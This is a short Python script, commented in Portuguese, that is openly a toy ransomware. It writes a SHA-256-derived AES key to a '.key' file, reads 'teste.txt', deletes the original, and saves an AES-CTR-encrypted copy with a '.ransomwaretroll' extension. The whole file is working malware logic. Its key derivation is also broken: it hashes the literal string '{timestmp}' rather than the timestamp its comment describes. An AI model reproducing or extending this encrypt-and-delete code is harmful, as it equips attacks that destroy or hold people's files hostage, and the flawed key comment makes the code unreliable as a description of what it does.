import os
import pyaes
import hashlib
import calendar
import time

## Cria um arquivo que conterá a chave de criptografia
key_file = ".key"
key_file = open(key_file,'wb')

# A chave será baseada no timestamp do dia atual
timestmp = calendar.timegm(time.gmtime())
key = hashlib.sha256()
key.update(b'{timestmp}')

## Salva a chave no arquivo
key_file.write(key.digest())
key_file.close()

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
aes = pyaes.AESModeOfOperationCTR(key.digest())

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
